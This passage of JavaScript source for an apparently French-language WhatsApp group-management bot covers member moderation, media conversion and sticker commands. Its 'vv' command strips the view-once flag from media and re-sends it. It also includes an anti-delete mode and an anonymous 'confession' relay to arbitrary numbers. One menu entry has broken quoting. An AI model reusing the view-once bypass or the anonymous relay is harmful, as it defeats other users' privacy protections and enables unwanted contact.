					const numbersOnly = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender
					try {
						await Kev.groupParticipantsUpdate(m.chat, [numbersOnly], 'add').then(async (res) =>{
							for (let i of res) {
								let invv = await Kev.groupInviteCode(m.chat)
								if (i.status == 408) return replygckev('Cet utilisateur vient juste de nou quitter!')
								if (i.status == 401) return replygckev('Cet utilisateur a bloquey le Bot!')
								if (i.status == 409) return replygckev('Cet Utilisateur a rejoint le groupe !')
								if (i.status == 500) return replygckev('Le Groupe Est Plein!')
								if (i.status == 403) {
									await Kev.sendMessage(m.chat, { text: `@${numbersOnly.split('@')[0]} Ne peut pas etre ajoutey\n\nUne nvitation sera envoyee a\n-> wa.me/${numbersOnly.replace(/\D/g, '')}\nen dm`, mentions: [numbersOnly] }, { quoted : m })
									await Kev.sendMessage(`${numbersOnly ? numbersOnly : '237656774511@s.whatsapp.net'}`, { text: `${'https://chat.whatsapp.com/' + invv}\n------------------------------------------------------\n\nAdmin: wa.me/${m.sender}\nVous invite a rejoindre ce groupe\nVeuillez integrer si cela ne vous derange pas🙇`, detectLink: true, mentions: [numbersOnly] }, { quoted : floc2 }).catch((err) => replygckev('invitation echouee!'))
								} else {
									replygckev('Succes!!')
								}
							}
						})
					} catch (e) {
						replygckev('Echec')
					}
				}
			}
			break
			case 'retirer': {
				if (!m.isGroup) return KevStickGroup()
				if (!m.isAdmin && !TontonKev) return KevStickAdmin()
				if (!m.isBotAdmin) return KevStickBotAdmin()
				if (!text && !m.quoted) {
					replygckev(`Exemple: ${prefix + command} 237xxx`)
				} else {
					const numbersOnly = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender
					await Kev.groupParticipantsUpdate(m.chat, [numbersOnly], 'remove').catch((err) => replygckev('Echec'))
				}
			}
			break
			case 'nommer': {
				if (!m.isGroup) return KevStickGroup()
				if (!m.isAdmin && !TontonKev) return KevStickAdmin()
				if (!m.isBotAdmin) return KevStickBotAdmin()
				if (!text && !m.quoted) {
					replygckev(`Exemple: ${prefix + command} 237xxx `)
				} else {
					const numbersOnly = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender
					await Kev.groupParticipantsUpdate(m.chat, [numbersOnly], 'promote').catch((err) => replygckev('Fail!'))
					replygckev(mess.done)
				}
			}
			break
			case 'demettre': {
				if (!m.isGroup) return KevStickGroup()
				if (!m.isAdmin && !TontonKev) return KevStickAdmin()
				if (!m.isBotAdmin) return KevStickBotAdmin()
				if (!text && !m.quoted) {
					replygckev(`Example: ${prefix + command} 237xxx `)
				} else {
					const numbersOnly = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender
					await Kev.groupParticipantsUpdate(m.chat, [numbersOnly], 'demote').catch((err) => replygckev('Failed!'))
					replygckev(mess.done)
				}
			}
			break
			case 'mod-nomgroupe': case 'nom-goupe': case 'setname': case 'setnamegc': case 'setsubject': case 'setsubjectgc': {
				if (!m.isGroup) return KevStickGroup()
				if (!m.isAdmin && !TontonKev) return KevStickAdmin()
				if (!m.isBotAdmin) return KevStickBotAdmin()
				if (!text && !m.quoted) {
					replygckev(`Exemple: ${prefix + command} texte`)
				} else {
					const teksnya = text ? text : m.quoted.text
					await Kev.groupUpdateSubject(m.chat, teksnya).catch((err) => replygckev('Fail!'))
				}
			}
			break
			case 'mod-description': case 'mod-desc': case 'setdesk': case 'setdeskgc': {
				if (!m.isGroup) return KevStickGroup()
				if (!m.isAdmin && !TontonKev) return KevStickAdmin()
				if (!m.isBotAdmin) return KevStickBotAdmin()
				if (!text && !m.quoted) {
					replygckev(`Exemple: ${prefix + command} Tonton Kev en place, Que de votre groupe renaisse de la soufrance`)
				} else {
					const teksnya = text ? text : m.quoted.text
					await Kev.groupUpdateDescription(m.chat, teksnya).catch((err) => replygckev('Fail!'))
				}
			}
			break
			case 'mod-groupepp':
            case 'mod-ppgroupe':
            case 'setppgc':
            case 'mod-groupepp':
            case 'setgruppp':
            case 'setgcpp':
                if (!m.isGroup) return KevStickGroup()
                if (!m.isAdmin && !TontonKev) return replygckev(mess.admin)
                if (!m.isBotAdmin) return KevStickBotAdmin()
                if (!quoted) return replygckev(`Veuillez repondre a une image ${prefix + command}`)
                if (!/image/.test(mime)) return replygckev(`Veuillez repondre a une image ${prefix + command}`)
                if (/webp/.test(mime)) return replygckev(`Veuillez repondre a une image ${prefix + command}`)
                var medis = await Kev.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await Kev.query({
                        tag: 'iq',
                        attrs: {
                            to: m.chat,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replygckev(mess.done)
                } else {
                    var memeg = await Kev.updateProfilePicture(m.chat, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replygckev(mess.done)
                }
                break
			case 'supprimer': case 'del': case 'supp': {
				if (!m.quoted) return replygckev('Veuillez repondre au message que vous voulez supprimer')
				await Kev.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: m.isBotAdmin ? false : true, id: m.quoted.id, participant: m.quoted.sender }})
			}
			break
			case 'lien-groupe': case 'lien': case 'linkgc': case 'urlgroup': case 'urlgrup': case 'urlgc': {
				if (!m.isGroup) return KevStickGroup()
				if (!m.isAdmin && !TontonKev) return KevStickAdmin()
				if (!m.isBotAdmin) return KevStickBotAdmin()
				let response = await Kev.groupInviteCode(m.chat)
				await Kev.sendMessage(m.chat, { text: `https://chat.whatsapp.com/${response}\n\nLink Group : ${(await Kev.groupMetadata(m.chat)).subject}`, detectLink: true }, { quoted: m });
			}
			break
			case 'reinitialiser': case 'revoke': case 'nouveau-lien': case 'newurl': {
				if (!m.isGroup) return KevStickGroup()
				if (!m.isAdmin && !TontonKev) return KevStickAdmin()
				if (!m.isBotAdmin) return KevStickBotAdmin()
				await Kev.groupRevokeInvite(m.chat).then((a) => {
					replygckev(`Lien du groupe ${m.metadata.subject} reinitialisey avec succes`)
				}).catch((err) => replygckev('Fail!'))
			}
			break
			case 'groupe': case 'grup': {
				if (!m.isGroup) return KevStickGroup()
				if (!m.isAdmin && !TontonKev) return KevStickAdmin()
				if (!m.isBotAdmin) return KevStickBotAdmin()
				if (text === 'close') {
					await Kev.groupSettingUpdate(m.chat, 'announcement').then((res) => replygckev(`*Groupe Fermey Aux Randoms*`))
				} else if (text === 'open') {
					await Kev.groupSettingUpdate(m.chat, 'not_announcement').then((res) => replygckev(`*Groupe Ouvert Au Randoms*`))
				} else {
					let button = [{
						name: 'single_select',
						buttonParamsJson: {
							title: 'SELECTION',
							sections: [{
								title: 'Group Mode',
								rows: [
									{ title: 'Ouvrir Le Groupe', description: 'Ouvrir Le Groupe', id: 'grup open' },
									{ title: 'Fermer Le Groupe, description: 'Fermer Ke Groupe, id: 'grup close' },
								]
							}]
						}
					}]
					await Kev.sendButtonMsg(m.chat, 'Groupe Mode', Kevinoutimewisher, 'Veuillez selectionner', null, button, m);
				}
			}
			break
			case 'supp-ppgroupe': case 'delppgc': case 'supp-ppgc': case 'supp-ppgroupe': {
if (!m.isGroup) return KevStickGroup()
if (!m.isAdmin && !TontonKev) return KevStickAdmin()
if (!m.isBotAdmin) return KevStickBotAdmin()
    await Kev.removeProfilePicture(m.chat)
    }
    break
    case 'sup-ppbot': case 'supp-botpp': case 'delppbot': {
if (!TontonKev) return KevStickOwner()
    await Kev.removeProfilePicture(Kev.user.id)
    replygckev(`Success in deleting bot's profile picture`)
    }
    break
			case 'anti-suppression': {
				if (!m.isGroup) return KevStickGroup()
				if (!m.isAdmin && !TontonKev) return KevStickAdmin()
				if (!m.isBotAdmin) return KevStickBotAdmin()
				if (text === 'on') {
					if (db.groups[m.chat].antidelete) return replygckev('*Sudah Aktif Sebelumnya*')
					db.groups[m.chat].antidelete = true
					replygckev('*Anti Suppression Activey !*')
				} else if (text === 'off') {
					db.groups[m.chat].antidelete = false
					replygckev('*Anti Suppression Desactivey!*')
				} else {
					let buttonnya = [{
						name: 'single_select',
						buttonParamsJson: {
							title: 'Pilih',
							sections: [{
								title: 'Anti Suppression',
								rows: [
									{ title: 'Activer', description: 'Activer Anti-suppression', id: 'anti-suppression on' },
									{ title: 'Desactiver', description: 'Desactiver Anti-suppression', id: 'anti-suppression off' },
								]
							}]
						}
					}]
					await Kev.sendButtonMsg(m.chat, 'Groupe Mode', Kevinoutimewisher, 'Veuillez Selectionner', null, buttonnya, m);
				}
			}
			break
			case 'chers-tous': {
				if (!m.isGroup) return KevStickGroup()
				if (!m.isAdmin && !TontonKev) return KevStickAdmin()
				if (!m.isBotAdmin) return KevStickBotAdmin()
				let teks = `*Chers Tous*\n\n*Message :* ${q ? q : ''}\n\n`
				for (let mem of m.metadata.participants) {
					teks += `${setv} @${mem.id.split('@')[0]}\n`
				}
				await Kev.sendMessage(m.chat, { text: teks, mentions: m.metadata.participants.map(a => a.id) }, { quoted: m })
			}
			break
			case 'ecoutez': case 'hey': {
				if (!m.isGroup) return KevStickGroup()
				if (!m.isAdmin && !TontonKev) return KevStickAdmin()
				if (!m.isBotAdmin) return KevStickBotAdmin()
				Kev.sendMessage(m.chat, { text : q ? q : '' , mentions: m.metadata.participants.map(a => a.id)}, { quoted: m })
			}
			break
			case 'totag': {
				if (!m.isGroup) return KevStickGroup()
				if (!m.isAdmin && !TontonKev) return KevStickAdmin()
				if (!m.isBotAdmin) return KevStickBotAdmin()
				if (!m.quoted) return replygckev(`Reply messages with captions ${prefix + command}`)
				delete m.quoted.chat
				await Kev.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: m.metadata.participants.map(a => a.id) })
			}
			break
			case 'liste-actifs': case 'liston': {
				if (!m.isGroup) return KevStickGroup()
				let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
				let online = [...Object.keys(store.presences[id]), botNumber]
				await Kev.sendMessage(m.chat, { text: 'La Liste Des Actifs:\n\n' + online.map(v => `${setv} @` + v.replace(/@.+/, '')).join`\n`, mentions: online }, { quoted: m }).catch((e) => replygckev('Fail'))
			}
			break
			
			// Bot Menu
			case 'proprio': {
				let list = []
for (let i of owner) {
list.push({
	    	displayName: await Kev.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await Kev.getName(i)}\nFN:${await Kev.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
                Kev.sendMessage(m.chat, {
                    contacts: {
                        displayName: `${list.length} Contact`,
                        contacts: list
                    }, contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                }, {
                    quoted: m
                })
            }
            break
			case 'profile': case 'cekme': case 'cek': {
				const user = Object.keys(global.db.users)
				const infoUser = global.db.users[m.sender]
				const teks = `*Profile @${m.sender.split('@')[0]}* :\nUtilisateur : ${user.includes(m.sender) ? 'True' : 'False'}\nUser : ${isVip ? 'VIP' : isPremium ? 'BOSS' : 'RANDOM'}\nLimite : ${infoUser.limit}\nMoney : ${infoUser ? infoUser.uang.toLocaleString('id-ID') : '0'}`
				await Kev.sendTextMentions(m.chat, teks, m)
			}
			break
			case 'req': case 'requete': {
				if (!text) return replygckev('Quelle requete voulez vous transmettre ??')
				await Kev.sendMessage(m.chat, { text: `*Requete sebd au proprio*\n_merci🙏_` }, { quoted: m })
				await Kev.sendFromOwner(ownernumber, `Requette De: @${m.sender.split('@')[0]}\nPour le proprio\n\nRequete ${text}`, m, { contextInfo: { mentionedJid: [m.sender], isForwarded: true }})
			}
			break
			case 'daily': case 'reclamer': {
				daily(Kev, m, global.db.users)
			}
			break
			case 'transfert-limite': case 'tflimit': case 'tlimit': {
				transferLimit(Kev, m, args, global.db.users)
			}
			break
			case 'transfert-argent': case 'tmoney': case 'transfer': {
				transferUang(Kev, m, args, global.db.users)
			}
			break
			case 'buy': {
				buy(m, args, db)
			}
			break
			case 'react': {
				Kev.sendMessage(m.chat, { react: { text: args[0], key: m.quoted ? m.quoted.key : m.key }})
			}
			break
			case 'tag-moi': {
				Kev.sendMessage(m.chat, { text: `@${m.sender.split('@')[0]}`, mentions: [m.sender] }, { quoted: m })
			}
			break
			
			case 'p': case 'ping': case 'botstatus': case 'statusbot': {
				const used = process.memoryUsage()
				const cpus = os.cpus().map(cpu => {
					cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
					return cpu
				})
				const cpu = cpus.reduce((last, cpu, _, { length }) => {
					last.total += cpu.total
					last.speed += cpu.speed / length
					last.times.user += cpu.times.user
					last.times.nice += cpu.times.nice
					last.times.sys += cpu.times.sys
					last.times.idle += cpu.times.idle
					last.times.irq += cpu.times.irq
					return last
				}, {
					speed: 0,
					total: 0,
					times: {
						user: 0,
						nice: 0,
						sys: 0,
						idle: 0,
						irq: 0
					}
				})
				let timestamp = speed()
				let latensi = speed() - timestamp
				neww = performance.now()
				oldd = performance.now()
				respon = `Temps De Reaction ${latensi.toFixed(4)} _Seconde_ \n ${oldd - neww} _milisecondes_\n\nTemps Actif : ${runtime(process.uptime())}\n\n💻 Info Du Server\nRAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}\n\n_Memoire NodeJS Utilisable_\n${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}\n\n${cpus[0] ? `_Total CPU Usage_\n${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}\n_CPU Core(s) Usage (${cpus.length} Core CPU)_\n${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}`.trim()
				replygckev(respon)
			}
			break
			case 'test-rapiditey': case 'rapiditey': {
				replygckev('Testing Speed...')
				let cp = require('child_process')
				let { promisify } = require('util')
				let exec = promisify(cp.exec).bind(cp)
				let o
				try {
					o = await exec('python3 sylvers.py')
				} catch (e) {
					o = e
				} finally {
					let { stdout, stderr } = o
					if (stdout.trim()) replygckev(stdout)
					if (stderr.trim()) replygckev(stderr)
				}
			}
			break
			case 'afk': {
				let user = global.db.users[m.sender]
				user.afkTime = + new Date
				user.afkReason = text
				replygckev(`@${m.sender.split('@')[0]} Been Afk ${text ? ': ' + text : ''}`)
			}
			break
			case 'vv': case 'voir-vueunik': case 'rvo': {
				if (!m.quoted) return replygckev(`Reply view once message\nExample: ${prefix + command}`)
				if (m.quoted.msg.viewOnce) {
					m.quoted.msg.viewOnce = false
					await Kev.sendMessage(m.chat, { forward: m.quoted }, { quoted: m })
				} else if (m.quoted.msg.message && m.quoted.msg.message.audioMessage && m.quoted.msg.message.audioMessage.viewOnce) {
					m.quoted.msg.message.audioMessage.viewOnce = false
					m.quoted.msg.message.audioMessage.contextInfo = { forwardingScore: 1, isForwarded: true, mentionedJid: [m.sender] }
					await Kev.relayMessage(m.chat, m.quoted.msg.message, {})
				} else {
					replygckev(`Veuillez repondre a un message en vue unique\nExemple: ${prefix + command}`)
				}
			}
			break
			case 'inspection': {
				if (!text) return replygckev('Veuillez Entrer Le Lien Du Groupe !')
				let code = q.match(/chat.whatsapp.com\/([\w\d]*)/g);
				if (code === null) return replygckev('invitation non detectee.');
				code = code[0].replace('chat.whatsapp.com/', '');
				await Kev.groupGetInviteInfo(code).then(anu => {
					let { id, subject, owner, subjectOwner, creation, desc, descId, participants, size, descOwner } = anu
					console.log(anu);
					let par = `*Nom Du Groupe* : ${subject}\n*ID* : ${id}\n${owner ? `*Createur* : @${owner.split('@')[0]}` : '*Creator* : -'}\n*Numbre De Participants* : ${size}\n*Date De Creation* : ${new Date(creation * 1000).toLocaleString()}\n*DescID* : ${descId ? descId : '-'}\n${subjectOwner ? `*Nom modifiey par* : @${subjectOwner.split('@')[0]}` : '*GC Name Changed By* : -'}\n${descOwner ? `*Desc modifiey par * : @${descOwner.split('@')[0]}` : '*Desc changed by* : -'}\n\n*Desc* : ${desc ? desc : '-'}\n`;
					Kev.sendTextMentions(m.chat, par, m);
				}).catch((res) => {
					if (res.data == 406) return replygckev('Group Not Found❗');
					if (res.data == 410) return replygckev('Group URL Has Been Reset❗');
				});
			}
			break
			case 'q': case 'quoted': {
				if (!m.quoted) return replygckev('Veuillez repondre a un message!')
				const anu = await m.getQuotedObj()
				if (!anu) return replygckev('Format Non Disponible!')
				if (!anu.quoted) return replygckev('Le Message Repondu n est pas une reponse')
				await Kev.relayMessage(m.chat, { [anu.quoted.type]: anu.quoted.msg }, {})
			}
			break
			case 'confession': case 'confess': case 'menfes': case 'menfess': {
				if (m.isGroup) return KevStickPrivate();
				if (game.menfes[m.sender]) return replygckev(`Vous ztes dans la session de ${command}!`)
				if (!text) return replygckev(`Exemple : ${prefix + command} 237xxx x|Faux nom`)
				let [teks1, teks2] = text.split`|`
				if (!isNaN(teks1) && !teks1.startsWith('0') && teks1) {
					const tujuan = teks1.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
					const onWa = await Kev.onWhatsApp(tujuan)
					if (!onWa.length > 0) return replygckev('Ce numero n est pas enregistrer sur whatsapp!')
					game.menfes[m.sender] = {
						tujuan: tujuan,
						nama: teks2,
						waktu: setTimeout(() => {
							if (game.menfes[m.sender]) replygckev(`_Temps de ${command} terminey_`)
							delete game.menfes[m.sender];
						}, 600000)
					};
					game.menfes[tujuan] = {
						tujuan: m.sender,
						nama: 'Recipient',
						waktu: setTimeout(() => {
							if (game.menfes[tujuan]) Kev.sendMessage(tujuan, { text: `_Temps ${command} terminey_` });
							delete game.menfes[tujuan];
						}, 600000)
					};
					Kev.sendMessage(tujuan, { text: `_${command} commence_\n*Note :* si vous voulez y mettre fin entrez _*${prefix}supp-${command}*_` });
					replygckev(`_Debut de ${command}..._\n*Vous pouvee commencer a envoyer vos message de confession/media*\n*Duree ${command} seulement pour 10 minutes*\n*Note :* si vous voulez y mettre fin veuillez entrer_*${prefix}del${command}*_`)
				} else {
					replygckev(`Veuillez entrer le numero!\nExample : ${prefix + command} 237xxx x|faux nom`)
				}
			}
			break
			case 'supp-confession': case 'delconfess': case 'delmenfes': case 'delmenfess': {
				if (!game.menfes[m.sender]) return replygckev(`You Are Not In ${command.split('del')[1]} session!`)
				let anu = game.menfes[m.sender]
				Kev.sendMessage(anu.tujuan, { text: `Chat Ended By ${anu.nama ? anu.nama : 'Somebody'}` })
				replygckev(`Sessiob de confession terminee ${command.split('del')[1]}!`)
				delete game.menfes[anu.tujuan];
				delete game.menfes[m.sender];
			}
			break
			
			// Tools Menu
			case 'fetch': case 'voir': {
				if (!text.startsWith('http')) return replygckev(`Aucune idee?\n\nExemple : ${prefix + command} https://google.com`)
				try {
					const res = await axios.get(isUrl(text) ? isUrl(text)[0] : text)
					if (!/json|html|plain/.test(res.headers['content-type'])) {
						await replygckev(text)
					} else {
						replygckev(util.format(res.data))
					}
				} catch (e) {
					replygckev(util.format(e))
				}
			}
			break
			case 'en-aud': case 'en-audio': {
				if (!/video/.test(mime) && !/audio/.test(mime)) return replygckev(`Veuillez repondre a une video/audio ${prefix + command}`)
				KevStickWait()
				let media = await (m.quoted ? m.quoted.download() : m.download())
				let audio = await toAudio(media, 'mp4')
				await Kev.sendMessage(m.chat, { audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
			}
			break
			case 'en-mp3': {
				if (!/video/.test(mime) && !/audio/.test(mime)) return replygckev(`Veuillez repondre a une video/audio ${prefix + command}`)
				KevStickWait()
				let media = await (m.quoted ? m.quoted.download() : m.download())
				let audio = await toAudio(media, 'mp4')
				await Kev.sendMessage(m.chat, { document: audio, mimetype: 'audio/mpeg', fileName: `kev.mp3`}, { quoted : m })
			}
			break
			case 'en-vn': case 'toptt': case 'en-voice': {
				if (!/video/.test(mime) && !/audio/.test(mime)) return replygckev(`Veuillez repondre a une video/audio ${prefix + command}`)
				KevStickWait()
				let media = await (m.quoted ? m.quoted.download() : m.download())
				let audio = await toPTT(media, 'mp4')
				await Kev.sendMessage(m.chat, { audio: audio, mimetype: 'audio/ogg; codecs=opus', ptt: true }, { quoted: m })
			}
			break
			case 'en-gif': {
				if (!/webp/.test(mime) && !/video/.test(mime)) return replygckev(`Veuillez repondre a une video/sticker animey *${prefix + command}*`)
				KevStickWait()
				let { webp2mp4File } = require('./bibliotheque/uploader')
				let media = await Kev.downloadAndSaveMediaMessage(qmsg)
				let webpToMp4 = await webp2mp4File(media)
				await Kev.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
				await fs.unlinkSync(media)
			}
			break
			case 'en-video': case 'en-mp4': {
				if (!/webp/.test(mime) && !/video/.test(mime)) return replygckev(`Veuillez repondre a une video/sticker animey *${prefix + command}*`)
				KevStickWait()
				let { webp2mp4File } = require('./bibliotheque/uploader')
				let media = await Kev.downloadAndSaveMediaMessage(qmsg)
				let webpToMp4 = await webp2mp4File(media)
				await Kev.sendMessage(m.chat, { video: { url: webpToMp4.result }, caption: 'Convert Webp To Video' }, { quoted: m })
				await fs.unlinkSync(media)
			}
			break
			case 'en-mage': case 'en-img': {
				if (!/webp/.test(mime)) return replygckev(`Veuillez repondre a une video/sticker animey *${prefix + command}*`)
				KevStickWait()
				let media = await Kev.downloadAndSaveMediaMessage(qmsg)
				let ran = await getRandom('.png')
				exec(`ffmpeg -i ${media} ${ran}`, (err) => {
					fs.unlinkSync(media)
					if (err) return replygckev('Fail❗')
					let buffer = fs.readFileSync(ran)
					Kev.sendMessage(m.chat, { image: buffer }, { quoted: m })
					fs.unlinkSync(ran)
				})
			}
			break
			case 'en-ptv': {
				if (!/video/.test(mime)) return replygckev(`Vzuillez repondre a une video ${prefix + command}`)
				if ((m.quoted ? m.quoted.type : m.type) === 'videoMessage') {
					const anu = await (m.quoted ? m.quoted.download() : m.download())
					const msg = await generateWAMessageContent({ video: anu }, { upload: Kev.waUploadToServer })
					await Kev.relayMessage(m.chat, { ptvMessage: msg.videoMessage }, {})
				} else {
					replygckev('Veuillez repondre a une video!')
				}
			}
			break
			case 'en-url': {
				let { fileIO, TelegraPh } = require('./bibliotheque/uploader')
				if (/jpg|jpeg|png/.test(mime)) {
					KevStickWait()
					let media = await (m.quoted ? m.quoted.download() : m.download())
					let anu = await TelegraPh(media)
					replygckev('Url : ' + anu)
				} else if (/webp|video|sticker|audio/.test(mime)) {
					KevStickWait()
					let media = await (m.quoted ? m.quoted.download() : m.download())
					let anu = await UploadFileUgu(media)
					replygckev('Url : ' + anu.url)
				} else {
					replygckev('Veuillez repondre a un media!')
				}
			}
			break
			case 'texttospeech-indo': case 'tts-indo': case 'ttsindo': {
				if (!text) return replygckev('Where is the text you want to convert to audio??')
				let { tts } = require('./bibliotheque/tts')
				let anu = await tts(text)
				Kev.sendMessage(m.chat, { audio: anu, ptt: true, mimetype: 'audio/mpeg' }, { quoted: m })
			}
			break
			case 'dis': case 'tts': case 'gtts':{
if (!text) return replygckev('Veuillez entrer le texte ?')
            let texttts = text
            const kevrl = googleTTS.getAudioUrl(texttts, {
                lang: "fr",
                slow: false,
                host: "https://translate.google.com",
            })
            return Kev.sendMessage(m.chat, {
                audio: {
                    url: kevrl,
                },
                mimetype: 'audio/mp4',
                ptt: true,
                fileName: `${text}.mp3`
            }, {
                quoted: m,
            })
        }
        break
			case 'en-qr': case 'qr': {
				if (!text) return replygckev(`Veuillez entrer un texte ou un lien\n\nExemple:\n*${prefix + command}* Tonton Kev`)
				KevStickWait()
				await Kev.sendMessage(m.chat, { image: { url: 'https://api.qrserver.com/v1/create-qr-code/?size=1000x1000&data=' + text }, caption: 'We The Best!!!' }, { quoted: m })
			}
			break
			case 'ss-web': {
				if (!text) return replygckev(`Exemple: ${prefix + command} https://github.com/kenvofc`)
				if (!text.startsWith('http')) {
					let buf = 'https://image.thum.io/get/width/1900/crop/1000/fullpage/https://' + q;
					await Kev.sendMessage(m.chat, { image: { url: buf }, caption: 'Done' }, { quoted: m })
				} else {
					let buf = 'https://image.thum.io/get/width/1900/crop/1000/fullpage/' + q;
					await Kev.sendMessage(m.chat, { image: { url: buf }, caption: 'Done' }, { quoted: m })
				}
			}
			break
			case'smeta': {
if (!/webp/.test(mime)) return replygckev('Veuillez repondre a un sticker!')
  var stiker = false
    try {
        let [packname, ...author] = q.split('|')
            //var author = (author  []).join('|')
                let mime = m.quoted.mimetype || ''
                        //let img = await q.download()
                            let img = await Kev.downloadAndSaveMediaMessage(quoted, makeid(5))
                                if (!img) return replygckev('Veuillez repondre a un sticker!')
                                    var stiker = await addExifAvatar(img, `Made by`, `Cheems Bot`)
                                      } catch (e) {
                                          console.error(e)
                                              if (Buffer.isBuffer(e)) stiker = e
                                                } finally {
                                                    if (stiker) Kev.sendMessage(m.chat, {
                                                          sticker: stiker
                                                              }, {
                                                                    quoted: m
                                                                        })
                                                                            else return replygckev('Veuillez repondre a un sticker')
                                                                              }
                                                                              }       
                                                                              break
			case 's': case 'sticker': case 'stiker': {
if (!quoted) return replygckev(`Veuillez repondre a une image un gif ou une courte video ${prefix+command}\nDuree de la video comprise entre 1-9 Secondes`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await Kev.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygckev('Veuillez repondre a une image un gif ou une courte video ${prefix+command}\nDuree de la video comprise entre 1-9 Secondes')
let media = await quoted.download()
let encmedia = await Kev.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else {
replygckev(`Veuillez repondre a une image un gif ou une courte video ${prefix+command}\nDuree de la video comprise entre 1-9 Secondes`)
}
}
break
case 'voler': case 'prendre': case 'stickerwm': case 'take':{
if (!isPremium) return replyprem(mess.premium)
if (!args.join(" ")) return replygckev(`Veuillez entrer le texte`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
Kev.downloadAndSaveMediaMessage(quoted, "gifee")
Kev.sendMessage(m.chat, {sticker:fs.readFileSync("gifee.webp")}, m, { packname: pcknm, author: atnm })
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await Kev.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygckev('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await Kev.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
replygckev(`Photo/Video?`)
}
}
break
			case 'smeme': case 'sticker-meme': case 'stickmeme': {
if (!/webp/.test(mime) && /image/.test(mime)) {
if (!text) return replygckev(`Usage: ${prefix + command} text1|text2`)
let { TelegraPh } = require('./bibliotheque/uploader')
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
mee = await Kev.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(mee)
meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem}`
memek = await Kev.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
} else {
replygckev(`Veuillez Reponde A Une Image  ${prefix + command} text1|text2`)
}
}
break
			case 'ecrire': {
				replygckev(`*Exemple*\n${prefix}ecrire-gauche text\n${prefix}ecrire-droite text\n${prefix}folioleft text\n${prefix}folioright text`)
			}
			break
			case 'ecrire-gauche': {
				if (!text) return replygckev(`Send command *${prefix + command}* text`)
				KevStickWait()
				const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
				const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
				spawn('convert', [
					'./recherche/write/images/book/beforeleft.jpg',
					'-font',
					'./recherche/write/font/Indie-Flower.ttf',
					'-size',
					'960x1280',
					'-pointsize',
					'23',
					'-interline-spacing',
					'2',
					'-annotate',
					'+140+153',
					fixHeight,
					'./recherche/write/images/book/afterleft.jpg'
				])
				.on('error', () => replygckev(mess.error))
				.on('exit', () => {
					Kev.sendMessage(m.chat, { image: fs.readFileSync('./recherche/write/images/book/afterleft.jpg'), caption: 'We The Best!!!' }, { quoted: m })
				})
			}
			break
			case 'ecrire-droite': {
				if (!text) return replygckev(`Send command *${prefix + command}* text`)
				KevStickWait()
				const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
				const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
				spawn('convert', [
					'./recherche/write/images/book/beforeright.jpg',
					'-font',
					'./recherche/write/font/Indie-Flower.ttf',
					'-size',
					'960x1280',
					'-pointsize',
					'23',
					'-interline-spacing',
					'2',
					'-annotate',
					'+128+129',
					fixHeight,
					'./recherche/write/images/book/afterright.jpg'
				])
				.on('error', () => replygckev(mess.error))
				.on('exit', () => {
